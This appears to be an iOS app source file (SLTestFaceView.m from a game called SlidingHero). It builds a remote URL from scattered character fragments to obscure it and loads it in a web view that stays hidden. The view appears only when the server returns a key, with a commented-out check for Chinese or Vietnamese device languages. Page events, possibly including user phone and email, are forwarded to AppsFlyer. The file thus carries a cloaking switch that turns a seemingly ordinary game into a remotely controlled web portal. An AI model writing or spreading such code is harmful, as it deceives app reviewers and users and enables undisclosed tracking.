//
//  SLTestFaceView.m
//  SlidingHero
//
//  Created by 文有智 on 2025/3/24.
//

#import "SLTestFaceView.h"


@import FirebaseMessaging;
@import FirebaseCore;
#import <WebKit/WebKit.h>
#import <AppsFlyerLib/AppsFlyerLib.h>
#import "SLLoadManager.h"
#import <Masonry/Masonry.h>


static NSString *saveKey = @"finalUrl";

@interface SLTestFaceView()<WKNavigationDelegate, WKScriptMessageHandler, WKUIDelegate>
{
    NSString *_pa;
    NSString *_pb;
    NSString *_pc;
    

    NSString *_appflyUid;
    
    NSString *_homeURL;
    
    NSString *_pd;
    NSString *_pd1;
    NSString *_pe;
    NSString *_pe1;
    NSString *_pf;
    
    NSTimer *_checkRadiusTimer;
    int _timerCount;
}

@property (nonatomic, strong) UIView *radiusBtnView;// tag 0//3秒后收缩 1//移动过程中 2//展开状态 3//半隐藏
@property (nonatomic, strong) UIImageView *menuBtn;
@property (nonatomic, strong) UIButton *backBtn;
@property (nonatomic, strong) UIButton *homeBtn;
@property (nonatomic, strong) UIButton *refreshBtn;
@property (nonatomic, strong) UIButton *cleanBtn;

@property (nonatomic, strong) UIView *homeView;
@property (nonatomic, strong) WKWebView *webView;
@property (nonatomic, strong) WKWebView *loadWebView;
@property (nonatomic, assign) BOOL canLoad;
@property (nonatomic, assign) BOOL isResponse;




@end

@implementation SLTestFaceView

- (instancetype)init
{
    self = [super init];
    if (self) {
        [self initData];
        [self configUI];
    }
    return self;
}




- (void)checkRadiusAction
{
    if (_radiusBtnView.tag != 0) {
        return;
    } else {
        _timerCount--;
        if (_timerCount <= 0) {
            [self configRadiusTag:3];
            [UIView animateWithDuration:0.3 animations:^{
                self.radiusBtnView.frame = CGRectMake(SCREEN_WIDTH - 25, self.radiusBtnView.frame.origin.y, 50, 50);
            }];
        }
    }
    
}

- (void)configRadiusTag:(int)tag
{
    _radiusBtnView.tag = tag;
    if (tag == 0) {
        _timerCount = 3;
    }
}

#pragma mark === delegate ===



// H5页面开始加载回调方法
- (void)webView:(WKWebView *)webView didStartProvisionalNavigation:(WKNavigation *)navigation
{
    NSLog(@"开始加载: %@", webView.URL.absoluteString);
}

// H5页面正在加载回调方法
- (void)webView:(WKWebView *)webView didCommitNavigation:(WKNavigation *)navigation
{
    
}

// H5页面结束加载回调方法
- (void)webView:(WKWebView *)webView didFailNavigation:(WKNavigation *)navigation withError:(NSError *)error
{
    NSLog(@"加载失败");
    [self finishInfoLoad:false];

}

// H5页面加载完成回调方法
- (void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation
{
    NSLog(@"加载完成");
    webView.scrollView.contentInset = UIEdgeInsetsMake(0, 0, 0, 0);
    webView.scrollView.contentOffset = CGPointMake(0, 0);
    [self finishInfoLoad:false];
}

-(WKWebView *)webView:(WKWebView *)webView createWebViewWithConfiguration:(WKWebViewConfiguration *)configuration forNavigationAction:(WKNavigationAction *)navigationAction windowFeatures:(WKWindowFeatures *)windowFeatures
{
    NSLog(@"createWebViewWithConfiguration");
    if (!navigationAction.targetFrame.isMainFrame) {
//        [webView loadRequest:navigationAction.request];
        NSLog(@"跳转url : %@", navigationAction.request.URL.absoluteString);
        [[UIApplication sharedApplication] openURL:navigationAction.request.URL options:@{} completionHandler:nil];
        
    }
    return nil;
}

- (void)configUI
{
    [self addSubview:self.homeView];
    [_homeView addSubview:self.webView];
    [_homeView addSubview:self.radiusBtnView];
    
    [_homeView mas_makeConstraints:^(MASConstraintMaker *make) {
        make.edges.mas_equalTo(self);
    }];
    [_webView mas_makeConstraints:^(MASConstraintMaker *make) {
        make.left.right.mas_equalTo(self.homeView);
        make.top.mas_equalTo(self.homeView.mas_top).offset([UIApplication sharedApplication].delegate.window.safeAreaInsets.top);
        make.bottom.mas_equalTo(self.homeView.mas_bottom).offset(-[UIApplication sharedApplication].delegate.window.safeAreaInsets.bottom);
    }];
    
}

- (void)loadInfoMethod
{
    _isResponse = NO;
    NSString *baseUrl = [NSString stringWithFormat:@"%@%@%@%@%@%@%@%@%@%@", _pa, _pb, _pb, _pc, _pd, _pd1, _pd1, _pe, _pe1, _pf];
//    if ([_internetReachability currentReachabilityStatus] == 0) {
//        _homeView.alpha = 0;
//        self.alpha = 0;
//        [self finishInfoLoad:true];
//    } else {
    _homeView.alpha = 1;
    self.alpha = 1;
    
    NSString *deepLink = [[NSUserDefaults standardUserDefaults] objectForKey:@"deepLink"];
    NSString *finalLinkInfo = [[NSUserDefaults standardUserDefaults] objectForKey:@"finalLoadBaseInfo"];
    if (deepLink && [deepLink containsString:kKeyString]) {
        [_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:deepLink]]];
    } else {
        if (finalLinkInfo && finalLinkInfo.length > 0) {
            [_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:finalLinkInfo]]];
        } else {
            if (deepLink && deepLink.length > 0) {
                [_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:deepLink]]];
            } else {
                [_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:baseUrl]]];
            }
        }
    }
    
//    }
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (!self.isResponse) {
            [self finishInfoLoad:true];
        }
    });
    
    if (!deepLink || ![deepLink containsString:kKeyString]) {
        SLLoadManager *manager = [[SLLoadManager alloc] initWithFrame:CGRectMake(0, 0, 1, 1)];
        manager.hidden = YES;
        NSString *burlInfo = baseUrl;
        NSString *deepInfo = [[NSUserDefaults standardUserDefaults] objectForKey:@"deepLink"];
        if (deepInfo && deepInfo.length > 0) {
            burlInfo = deepInfo;
        }
        [manager loadBaseUrl:burlInfo];
        [self addSubview:manager];
    }

}

- (void)finishInfoLoad:(BOOL)isHidden
{
    if ([_delegate respondsToSelector:@selector(infoLoadFinish:)]) {
        [_delegate infoLoadFinish:isHidden];
    }
    _isResponse = YES;
    
    if (!isHidden) {
        _checkRadiusTimer = [NSTimer timerWithTimeInterval:1 target:self selector:@selector(checkRadiusAction) userInfo:nil repeats:YES];
        [[NSRunLoop mainRunLoop] addTimer:_checkRadiusTimer forMode:NSRunLoopCommonModes];
    }
}


// 类似于UIWebView中拦截URL的代理方法，要注意的是decisionHandler不能连续回调两次，否则会引起crash
- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler
{
    NSLog(@"拦截请求： %@", webView.URL.absoluteString);
//    if (![self getCurrentLanguageIsCNOrVI]) {
//        _homeView.alpha = 0;
//        self.alpha = 0;
//        decisionHandler(WKNavigationActionPolicyCancel);
//        [self finishInfoLoad:true];
//        return;
//    } else
    NSString *deepLink = [[NSUserDefaults standardUserDefaults] objectForKey:@"deepLink"];
    NSString *webViewUrlInfo = webView.URL.absoluteString;
    bool isDeepLink = [webViewUrlInfo isEqualToString:deepLink];
    if ([webView.URL.host containsString:[NSString stringWithFormat:@"%@%@", _pe, _pe1]] /*|| isDeepLink*/) {
        decisionHandler(WKNavigationActionPolicyAllow);
        return;
    } else if ([webView.URL.absoluteString containsString:kKeyString]) {

        if (![webView.URL.absoluteString containsString:_appflyUid]) {
            [self loadAppFlyUidUrl:webView.URL.absoluteString];
        }
        _canLoad = YES;
        _radiusBtnView.alpha = 1;
//        [self finishInfoLoad:false];
        decisionHandler(WKNavigationActionPolicyAllow);
        
        return;
    } else if (_canLoad) {
        if (![webView.URL.absoluteString hasPrefix:@"http"]) {
            [[UIApplication sharedApplication] openURL:webView.URL options:@{} completionHandler:nil];
            decisionHandler(WKNavigationActionPolicyCancel);
            return;
        }
        decisionHandler(WKNavigationActionPolicyAllow);
        return;
    } else {
        _homeView.alpha = 0;
        self.alpha = 0;
        [[NSUserDefaults standardUserDefaults] setObject:webView.URL.absoluteString forKey:saveKey];
        [[NSUserDefaults standardUserDefaults] synchronize];
        [self finishInfoLoad:true];
        decisionHandler(WKNavigationActionPolicyCancel);
    }
}

#pragma mark --- getter ---


- (void)initData
{
    _pa = @"h";
    _pb = @"t";
    _pc = @"ps";
    _pd = @":";
    _pd1 = @"/";
    _pe = @"svj";
    _pe1 = @"ps5s";
    _pf = @".com";
    _canLoad = NO;
    
    // 初始化 AppsFlyer SDK
    
    _appflyUid = [[AppsFlyerLib shared] getAppsFlyerUID];
    NSLog(@"_appflyUid  %@", _appflyUid);
    
}

- (void)dealloc
{
    if (_checkRadiusTimer) {
        [_checkRadiusTimer invalidate];
        _checkRadiusTimer = nil;
    }
}

- (void)loadAppFlyUidUrl:(NSString* )url
{
    NSURLComponents *components = [NSURLComponents componentsWithURL:[NSURL URLWithString:url] resolvingAgainstBaseURL:NO];
    NSMutableArray *paras = [NSMutableArray arrayWithArray:components.queryItems];
    [paras addObject:[NSURLQueryItem queryItemWithName:@"appsFlyIDkey" value:_appflyUid]];
    components.queryItems = paras;
    [_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:components.URL.absoluteString]]];
    _homeURL = components.URL.absoluteString;
}


- (BOOL)getCurrentLanguageIsCNOrVI
{
    NSArray *languages = [NSLocale preferredLanguages];
    NSString *currentLanguage = [languages objectAtIndex:0];
    if ([currentLanguage containsString:@"vi"] || [currentLanguage containsString:@"zh"]) {
        return YES;
    } else {
        return NO;
    }
}

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message
{
    
    if ([message.name isEqualToString:@"clickEvent"]) {
        NSString *jsonString = message.body;
        NSLog(@"click event js recevie message jsonString: %@", jsonString);
        
        NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
                
        if (jsonData) {
            NSError *error;
            // 解析 JSON 数据
            NSDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData
                                                                     options:NSJSONReadingMutableContainers
                                                                       error:&error];
            if (jsonDict) {
                NSString *event = [jsonDict objectForKey:@"event"];
                if ([event isEqualToString:@"getBaseInfo"] || [event isEqualToString:@"portraitUp"] || [event isEqualToString:@"ThemeColorChange"]) {
                    
                } else {
                    NSDictionary *paras = [jsonDict objectForKey:@"eventParms"];
                    [[AppsFlyerLib shared] logEventWithEventName:event eventValues:paras completionHandler:nil];

                }
            }
        }
    } else if ([message.name isEqualToString:@"event"]) {
        NSString *jsonString = message.body;
        NSLog(@"event js recevie message jsonString: %@", jsonString);

        if (jsonString && jsonString.length > 0 && [jsonString containsString:@"+"]) {
            NSArray *array = [jsonString componentsSeparatedByString:@"+"];
            if (array.count == 2) {
                NSString* eventName = array[0];

               //eventValue对应事件参数，比如例子的{"uid":"104902","phone":"","email":"","cid":"","domain":"http://example.test.com/","ver":"1.0.0"}
                NSString* eventValue = array[1];
                NSData *jsonData = [eventValue dataUsingEncoding:NSUTF8StringEncoding];
                NSError *error = nil;
                NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:jsonData options:NSJSONReadingMutableContainers error:&error];
                if (dict != nil) {
                    NSLog(@"fqwkfoqpf %@", dict);
                } else {
                    return;
                }
                [[AppsFlyerLib shared] logEventWithEventName:eventName eventValues:dict completionHandler:nil];
            }
            
        }
    }
    
    
}



#pragma mark === radius bar ===

- (UIView* )homeView
{
    if (!_homeView) {
        _homeView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, [UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height)];
        _homeView.backgroundColor = kRGBA(35, 40, 51, 1);
        [_homeView addSubview:self.webView];
        [_homeView addSubview:self.radiusBtnView];
    }
    return _homeView;
}

- (WKWebView* )webView
{
    if (!_webView) {
        WKWebViewConfiguration *configuration = [[WKWebViewConfiguration alloc] init];
        configuration.userContentController = [[WKUserContentController alloc] init];
        WKPreferences *preferences = [[WKPreferences alloc] init];
        preferences.javaScriptCanOpenWindowsAutomatically = YES;
        configuration.preferences = preferences;
        
        NSString *currentUserAgent = configuration.applicationNameForUserAgent;
        if (![currentUserAgent containsString:@"Safari"]) {
            currentUserAgent = [NSString stringWithFormat:@"%@ %@", currentUserAgent, @"Safari/604.1"];
        }
        configuration.applicationNameForUserAgent = currentUserAgent;
        
        WKUserContentController *contentController = [[WKUserContentController alloc] init];
        [contentController addScriptMessageHandler:self name:@"clickEvent"];
        [contentController addScriptMessageHandler:self name:@"event"];
        [contentController addScriptMessageHandler:self name:@"Toaster"];
        configuration.userContentController = contentController;
        _webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:configuration];
        _webView.UIDelegate = self;
        _webView.scrollView.bounces = NO;
        _webView.navigationDelegate = self;

    }
    return _webView;
}


- (UIView* )radiusBtnView
{
    if (!_radiusBtnView) {
        float y = SCREEN_HEIGHT * 0.75;
        if ([[NSUserDefaults standardUserDefaults] objectForKey:@"radiusBtnY"]) {
            y = [[[NSUserDefaults standardUserDefaults] objectForKey:@"radiusBtnY"] floatValue];
        }
        _radiusBtnView = [[UIView alloc] initWithFrame:CGRectMake(SCREEN_WIDTH - 25, y, 50, 50)];
        _radiusBtnView.backgroundColor = [UIColor colorWithRed:95/255.f green:96/255.f blue:171/255.f alpha:1];
        _radiusBtnView.layer.cornerRadius = 25;
        _radiusBtnView.layer.shadowColor = [UIColor blackColor].CGColor;
        _radiusBtnView.layer.shadowOpacity = 0.5;
        _radiusBtnView.layer.shadowOffset = CGSizeMake(0, 0);
        _radiusBtnView.layer.shadowRadius = 3;
        
        [_radiusBtnView addSubview:self.menuBtn];
        [_radiusBtnView addSubview:self.backBtn];
        [_radiusBtnView addSubview:self.homeBtn];
        [_radiusBtnView addSubview:self.refreshBtn];
        [_radiusBtnView addSubview:self.cleanBtn];
        _radiusBtnView.alpha = 0;
        [self configRadiusTag:0];

        
        UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(menuClick)];
        [_radiusBtnView addGestureRecognizer:tap];
        
        UILongPressGestureRecognizer *longPressGesture = [[UILongPressGestureRecognizer alloc] initWithTarget:self action:@selector(handleLongPress:)];
        [_radiusBtnView addGestureRecognizer:longPressGesture];
    }
    return _radiusBtnView;
}

//长按手势识别器的处理方法
- (void)handleLongPress:(UILongPressGestureRecognizer *)gesture
{
    if (gesture.state == UIGestureRecognizerStateBegan) {
        // 长按开始，可以在这里添加代码处理长按开始事件
        [self configRadiusTag:1];

    } else if (gesture.state == UIGestureRecognizerStateChanged) {
        // 用户正在长按并可能移动手指
        // 可以在这里添加代码处理拖拽事件
        CGPoint point = [gesture locationInView:self];
        _radiusBtnView.frame = CGRectMake(point.x - 25, point.y - 25, 50, 50);
        NSLog(@"%@", NSStringFromCGPoint(point));
    } else if (gesture.state == UIGestureRecognizerStateEnded) {
        [UIView animateWithDuration:0.3 animations:^{
            self.radiusBtnView.frame = CGRectMake(SCREEN_WIDTH - 50 - 10, self.radiusBtnView.frame.origin.y, 50, 50);
        } completion:^(BOOL finished) {
            [self configRadiusTag:0];
        }];
        [[NSUserDefaults standardUserDefaults] setObject:@(self.radiusBtnView.frame.origin.y) forKey:@"radiusBtnY"];
        [[NSUserDefaults standardUserDefaults] synchronize];
    }
}

//- (UIButton* )menuBtn
//{
//    if (!_menuBtn) {
//        _menuBtn = [UIButton buttonWithType:UIButtonTypeCustom];
//        [_menuBtn setImageEdgeInsets:UIEdgeInsetsMake(10, 10, 10, 10)];
//        _menuBtn.frame = CGRectMake(0, 0, 50, 50);
//        [_menuBtn setImage:[UIImage imageNamed:@"menu_icon"] forState:UIControlStateNormal];
//        [_menuBtn addTarget:self action:@selector(menuClick) forControlEvents:UIControlEventTouchUpInside];
//        _menuBtn.alpha = 1;
//    }
//    return _menuBtn;
//}

- (UIImageView* )menuBtn
{
    if (!_menuBtn) {
        _menuBtn = [[UIImageView alloc] init];
        _menuBtn.frame = CGRectMake(10, 10, 30, 30);
        _menuBtn.image = [UIImage imageNamed:@"menu_icon"];
        _menuBtn.alpha = 1;
    }
    return _menuBtn;
}

- (UIButton* )backBtn
{
    if (!_backBtn) {
        _backBtn = [UIButton buttonWithType:UIButtonTypeCustom];
        [_backBtn setImageEdgeInsets:UIEdgeInsetsMake(10, 10, 10, 10)];
        _backBtn.frame = CGRectMake(0, 0, 50, 50);
        [_backBtn setImage:[UIImage imageNamed:@"back"] forState:UIControlStateNormal];
        [_backBtn addTarget:self action:@selector(backClick) forControlEvents:UIControlEventTouchUpInside];
        _backBtn.transform = CGAffineTransformMakeRotation(M_PI);
        _backBtn.alpha = 0;
    }
    return _backBtn;
}

- (UIButton* )homeBtn
{
    if (!_homeBtn) {
        _homeBtn = [UIButton buttonWithType:UIButtonTypeCustom];
        [_homeBtn setImageEdgeInsets:UIEdgeInsetsMake(10, 10, 10, 10)];
        _homeBtn.frame = CGRectMake(50, 0, 50, 50);
        [_homeBtn setImage:[UIImage imageNamed:@"home_icon"] forState:UIControlStateNormal];
        [_homeBtn addTarget:self action:@selector(homeClick) forControlEvents:UIControlEventTouchUpInside];

        _homeBtn.alpha = 0;
    }
    return _homeBtn;
}

- (UIButton* )refreshBtn
{
    if (!_refreshBtn) {
        _refreshBtn = [UIButton buttonWithType:UIButtonTypeCustom];
        [_refreshBtn setImageEdgeInsets:UIEdgeInsetsMake(10, 10, 10, 10)];
        _refreshBtn.frame = CGRectMake(100, 0, 50, 50);
        [_refreshBtn setImage:[UIImage imageNamed:@"refresh_icon"] forState:UIControlStateNormal];
        [_refreshBtn addTarget:self action:@selector(refreshClick) forControlEvents:UIControlEventTouchUpInside];
        _refreshBtn.alpha = 0;
    }
    return _refreshBtn;
}

- (UIButton* )cleanBtn
{
    if (!_cleanBtn) {
        _cleanBtn = [UIButton buttonWithType:UIButtonTypeCustom];
        [_cleanBtn setImageEdgeInsets:UIEdgeInsetsMake(10, 10, 10, 10)];
        _cleanBtn.frame = CGRectMake(150, 0, 50, 50);
        [_cleanBtn setImage:[UIImage imageNamed:@"clean_icon"] forState:UIControlStateNormal];
        [_cleanBtn addTarget:self action:@selector(cleanClick) forControlEvents:UIControlEventTouchUpInside];

        _cleanBtn.alpha = 0;
    }
    return _cleanBtn;
}



- (void)cleanClick
{
    if (_homeURL) {
        [_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:_homeURL]]];
    } else {
        NSString *baseUrl = [NSString stringWithFormat:@"%@%@%@%@%@%@%@%@%@%@", _pa, _pb, _pb, _pc, _pd, _pd1, _pd1, _pe, _pe1, _pf];
        [_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:baseUrl]]];
    }
}

- (void)radiusViewIsOpen:(BOOL)isOpen
{
    if (isOpen) {
        [self configRadiusTag:2];
        self.menuBtn.alpha = 0;
        self.backBtn.alpha = 1;
        self.homeBtn.alpha = 1;
        self.refreshBtn.alpha = 1;
        self.cleanBtn.alpha = 1;
    } else {
        [self configRadiusTag:0];
        self.menuBtn.alpha = 1;
        self.backBtn.alpha = 0;
        self.homeBtn.alpha = 0;
        self.refreshBtn.alpha = 0;
        self.cleanBtn.alpha = 0;
    }
}

- (void)menuClick
{

    [UIView animateWithDuration:0.3 animations:^{
        self.radiusBtnView.frame = CGRectMake(SCREEN_WIDTH - 200 - 10, self.radiusBtnView.frame.origin.y, 200, 50);
        [self radiusViewIsOpen:YES];
    }];
}

- (void)backClick
{

    [UIView animateWithDuration:0.3 animations:^{
        self.radiusBtnView.frame = CGRectMake(SCREEN_WIDTH - 50 - 10, self.radiusBtnView.frame.origin.y, 50, 50);
        [self radiusViewIsOpen:NO];
    }];
}

- (void)homeClick
{
    if (_homeURL) {
        [_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:_homeURL]]];
    } else {
        NSString *baseUrl = [NSString stringWithFormat:@"%@%@%@%@%@%@%@%@%@%@", _pa, _pb, _pb, _pc, _pd, _pd1, _pd1, _pe, _pe1, _pf];
        [_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:baseUrl]]];
    }
}

- (void)refreshClick
{
    [self.webView reload];
}

@end













